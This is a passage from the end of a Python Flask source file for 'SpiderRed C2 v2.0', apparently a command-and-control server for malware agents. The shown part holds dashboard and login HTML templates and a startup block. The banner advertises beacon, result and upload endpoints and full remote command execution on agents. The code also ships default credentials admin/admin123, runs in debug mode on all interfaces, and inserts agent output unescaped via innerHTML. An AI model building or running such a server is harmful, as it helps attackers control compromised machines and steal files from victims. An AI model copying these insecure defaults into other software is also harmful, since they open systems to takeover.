        // Añadir línea al terminal
        function addTerminalLine(text) {
            const terminal = document.getElementById('terminal');
            const line = document.createElement('div');
            line.className = 'terminal-line';
            line.innerHTML = `<span class="prompt">$</span> ${text}`;
            terminal.appendChild(line);
            terminal.scrollTop = terminal.scrollHeight;
        }
        
        // Añadir al historial
        function addToCommandHistory(data) {
            const history = document.getElementById('command-history');
            const item = document.createElement('div');
            item.className = 'agent-item';
            item.innerHTML = `
                <div class="agent-name">${data.agent_id}</div>
                <div class="agent-info">${data.completed_time}</div>
                <div class="agent-info">${data.result}</div>
            `;
            history.insertBefore(item, history.firstChild);
        }
        
        // Limpiar terminal
        function clearTerminal() {
            document.getElementById('terminal').innerHTML = '';
        }
        
        // Refrescar dashboard
        function refreshDashboard() {
            loadAgents();
            loadFiles();
            addTerminalLine('Dashboard refreshed');
        }
        
        // Inicializar
        window.onload = function() {
            loadAgents();
            loadFiles();
            addTerminalLine('SpiderRed C2 Dashboard Ready');
        };
    </script>
</body>
</html>''',
        'login': '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SpiderRed C2 - Login</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background: linear-gradient(135deg, #0a0a0f 0%, #050508 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
            overflow: hidden;
        }
        
        .login-box {
            background: rgba(10, 10, 15, 0.9);
            border: 2px solid #00ff88;
            border-radius: 10px;
            padding: 40px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 0 30px rgba(0, 255, 136, 0.3);
            animation: pulse 2s infinite alternate;
            backdrop-filter: blur(10px);
        }
        
        @keyframes pulse {
            from { box-shadow: 0 0 20px rgba(0, 255, 136, 0.3); }
            to { box-shadow: 0 0 40px rgba(0, 255, 136, 0.6); }
        }
        
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo h1 {
            color: #00ff88;
            font-size: 2.5em;
            text-shadow: 0 0 10px #00ff88;
            letter-spacing: 2px;
            margin-bottom: 10px;
        }
        
        .logo p {
            color: #aaa;
            font-size: 0.9em;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            color: #00ff88;
            margin-bottom: 8px;
            font-size: 0.9em;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .form-group input {
            width: 100%;
            padding: 12px;
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid #00ff88;
            border-radius: 5px;
            color: white;
            font-family: 'Courier New', monospace;
            font-size: 1em;
            transition: all 0.3s ease;
        }
        
        .form-group input:focus {
            outline: none;
            box-shadow: 0 0 15px rgba(0, 255, 136, 0.5);
            border-color: #00ffff;
        }
        
        .btn-login {
            width: 100%;
            padding: 15px;
            background: linear-gradient(45deg, #00ff88, #ff0080);
            border: none;
            border-radius: 5px;
            color: white;
            font-family: 'Courier New', monospace;
            font-size: 1.1em;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 2px;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
        }
        
        .btn-login:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(255, 0, 128, 0.5);
        }
        
        .error {
            color: #ff0000;
            text-align: center;
            margin-bottom: 15px;
            font-size: 0.9em;
            text-shadow: 0 0 5px #ff0000;
        }
        
        .footer {
            text-align: center;
            margin-top: 20px;
            color: #666;
            font-size: 0.8em;
        }
        
        .hacker-text {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            pointer-events: none;
            z-index: -1;
            color: rgba(0, 255, 136, 0.1);
            font-size: 12px;
            line-height: 1.2;
            overflow: hidden;
        }
    </style>
</head>
<body>
    <div class="hacker-text" id="hackerText"></div>
    
    <div class="login-box">
        <div class="logo">
            <h1>🕷️ SPIDERRED</h1>
            <p>Command & Control v2.0</p>
        </div>
        
        {% if error %}
        <div class="error">{{ error }}</div>
        {% endif %}
        
        <form method="POST" action="/login">
            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" id="username" name="username" required autocomplete="off">
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required autocomplete="off">
            </div>
            
            <button type="submit" class="btn-login">
                ACCESS DASHBOARD
            </button>
        </form>
        
        <div class="footer">
            Default: admin / admin123
        </div>
    </div>
    
    <script>
        // Efecto de texto hacker
        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@!%^&*";
        const hackerText = document.getElementById('hackerText');
        
        function createHackerText() {
            let text = '';
            for (let i = 0; i < 1000; i++) {
                text += chars.charAt(Math.floor(Math.random() * chars.length));
                if (i % 100 === 99) text += '\\n';
            }
            hackerText.textContent = text;
            
            // Animar
            const lines = hackerText.textContent.split('\\n');
            setInterval(() => {
                let newText = '';
                lines.forEach(line => {
                    let newLine = '';
                    for (let char of line) {
                        if (Math.random() > 0.95) {
                            newLine += chars.charAt(Math.floor(Math.random() * chars.length));
                        } else {
                            newLine += char;
                        }
                    }
                    newText += newLine + '\\n';
                });
                hackerText.textContent = newText;
            }, 100);
        }
        
        createHackerText();
    </script>
</body>
</html>'''
    }
    
    if template_name in templates:
        return templates[template_name]
    return "Template not found", 404

# ==================== EJECUCIÓN ====================
if __name__ == '__main__':
    # Crear directorios necesarios
    os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
    os.makedirs('templates', exist_ok=True)
    
    # Inicializar base de datos
    init_database()
    
    print("""
    ╔══════════════════════════════════════════════════════════╗
    ║                 🕷️ SPIDERRED C2 v2.0                    ║
    ║                  Advanced C2 Server                     ║
    ║                                                          ║
    ║  • Dashboard: http://localhost:5000                     ║
    ║  • API Endpoints: /beacon, /result, /upload             ║
    ║  • WebSocket: Real-time updates                         ║
    ║  • File Management: Upload/Download                     ║
    ║  • Agent Control: Full command execution                ║
    ║                                                          ║
    ║  Default Login: admin / admin123                        ║
    ╚══════════════════════════════════════════════════════════╝
    """)
    
    # Iniciar servidor
    socketio.run(app, 
                host='0.0.0.0', 
                port=8443,  # Mismo puerto que el agente
                debug=True, 
                allow_unsafe_werkzeug=True)
